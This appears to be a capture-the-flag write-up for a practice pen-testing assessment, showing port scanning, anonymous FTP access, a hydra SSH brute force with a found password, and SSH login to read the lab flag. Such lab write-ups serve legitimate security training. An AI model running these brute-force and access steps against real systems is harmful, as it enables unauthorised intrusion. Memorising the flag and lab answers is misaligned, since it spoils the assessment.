---
title: "Medium"
category: ["PREP_CPTS", "Pen-testing", "Attacking Common Services", "Skill assesemnt", "Medium"]
---


````
## Port Scan


sudo nmap -v -sV -p- 10.129.201.127
````


```
PORT       STATE     SERVICE        VERSION
22/tcp     open      ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
53/tcp     open      domain         ISC BIND 9.16.1 (Ubuntu Linux)
110/tcp    open      pop3           Dovecot pop3d
995/tcp    open      ssl/pop3       Dovecot pop3d
30021/tcp  open      ftp
```

Five open ports were discovered. Notably, the **FTP service** on this host is running on a non-standard port (**30021/tcp**) instead of the default port 21.
## FTP Enumeration & Access

We can successfully authenticate to the FTP service using an **anonymous login**:


```
ftp 10.129.14.176 30021
```


```
Connected to 10.129.14.176.
220 ProFTPD Server (Internal FTP) [10.129.14.176]
Name (10.129.14.176:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

While enumerating the directories, we identified a folder named `simon` (likely indicating the only user on the system). Inside, we found a notes file and downloaded it locally:


```
ftp> ls
229 Entering Extended Passive Mode (|||59483|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||50226|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
229 Entering Extended Passive Mode (|||42036|)
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
100% |***************************************|   153      209.55 KiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (2.49 KiB/s)
ftp> 
```

Inspecting `mynotes.txt` reveals a list of potential passwords:


```
cat mynotes.txt
```


```
1   │ 234987123948729384293
2   │ +23358093845098
3   │ ThatsMyBigDog
4   │ Rock!ng#May
5   │ Puuuuuh7823328
6   │ 8Ns8j1b!23hs4921smHzwn
7   │ 237oHs71ohls18H127!!9skaP
8   │ 238u1xjn1923nZGSb261Bs81
```

With a target username (`simon`) and a custom wordlist (`mynotes.txt`), we can proceed to brute-force the SSH service to gain initial access.
## SSH Brute Force

We will use `hydra` to perform the password-cracking attack against the SSH service:


```
hydra -l simon -P mynotes.txt -f 10.129.14.176 ssh
```


```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2024-05-06 19:19:17

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile found...
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.129.14.176:22/
[22][ssh] host: 10.129.14.176   login: simon   password: 8Ns8j1b!23hs4921smHzwn
[STATUS] attack finished for 10.129.14.176 (valid pair found)
```

**Success!** Valid credentials found for user `simon`.
## Initial Access via SSH

We can now establish an SSH connection to the target host and retrieve the user flag:


```
ssh simon@10.129.14.176
```


```
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```